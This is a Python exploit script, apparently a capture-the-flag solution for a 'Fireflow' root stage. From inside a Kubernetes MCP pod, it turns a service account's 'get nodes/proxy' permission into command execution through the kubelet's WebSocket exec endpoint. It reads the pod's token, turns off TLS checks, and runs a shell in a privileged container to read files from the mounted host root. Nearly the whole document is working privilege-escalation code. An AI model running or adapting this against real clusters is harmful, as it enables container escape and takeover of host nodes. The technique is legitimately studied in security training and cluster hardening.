#!/usr/bin/env python3
"""
Kubelet exec via `get nodes/proxy` (Fireflow root stage).

Run this INSIDE the MCP pod (register it as a tool with mcp_client.py). The
pod's service account has only `get nodes/proxy`, which is enough: a kubelet
exec runs over a WebSocket, and a WebSocket handshake is an HTTP GET, so it
authorizes as `get` (no second `create` check is performed).

Load-bearing details, straight from the kubelet source:
  - params are input/output/error (NOT stdin/stdout/stderr)
  - the VALUE must be "1" (NOT "true"):  req.FormValue("output") == "1"
  - subprotocol v4.channel.k8s.io
  - streams are multiplexed by a leading channel byte: 0 stdin, 1 stdout, 2 stderr

Requires the `websockets` library (present in the target MCP pod).
The target container runs privileged as root and mounts the host / at /host/root.
"""
import asyncio, ssl, json, urllib.parse, urllib.request
import websockets

SA    = "/var/run/secrets/kubernetes.io/serviceaccount"
TOKEN = open(f"{SA}/token").read().strip()
CA    = f"{SA}/ca.crt"
NODE  = "<target>"           # node IP, reachable from the pod on :10250
NS    = "monitoring"
CNT   = "node-exporter"

CMD = "id; cat /host/root/root/root.txt"   # host / is mounted at /host/root


def _api_get(path: str) -> str:
    ctx = ssl.create_default_context(cafile=CA)
    req = urllib.request.Request("https://kubernetes.default.svc" + path,
                                 headers={"Authorization": f"Bearer {TOKEN}"})
    with urllib.request.urlopen(req, context=ctx, timeout=15) as r:
        return r.read().decode()


def _target_pod() -> str:
    pods = json.loads(_api_get("/api/v1/nodes/fireflow/proxy/runningpods/"))
    return next(p["metadata"]["name"] for p in pods["items"]
                if p["metadata"]["namespace"] == NS
                and "node-exporter" in p["metadata"]["name"])


async def ws_exec(pod: str, cmd: str) -> None:
    kctx = ssl.create_default_context()
    kctx.check_hostname = False
    kctx.verify_mode = ssl.CERT_NONE
    args = "&".join(f"command={urllib.parse.quote(p)}" for p in ["/bin/sh", "-c", cmd])
    url = f"wss://{NODE}:10250/exec/{NS}/{pod}/{CNT}?output=1&error=1&{args}"
    async with websockets.connect(
            url, ssl=kctx,
            additional_headers={"Authorization": f"Bearer {TOKEN}"},
            subprotocols=["v4.channel.k8s.io"], open_timeout=12) as ws:
        out = b""
        while True:
            try:
                data = await asyncio.wait_for(ws.recv(), timeout=6)
            except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
                break
            if isinstance(data, bytes) and len(data) > 1 and data[0] == 1:  # stdout
                out += data[1:]
        print(out.decode("utf-8", "replace"))


if __name__ == "__main__":
    asyncio.run(ws_exec(_target_pod(), CMD))
